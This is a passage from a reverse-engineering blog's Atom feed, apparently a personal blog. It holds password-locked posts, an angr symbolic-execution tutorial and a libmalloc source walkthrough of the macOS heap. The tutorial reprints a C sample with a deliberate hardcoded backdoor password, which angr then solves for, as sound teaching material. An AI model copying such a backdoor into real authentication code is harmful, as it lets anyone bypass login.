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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
      <category term="auto.js" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/auto-js/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    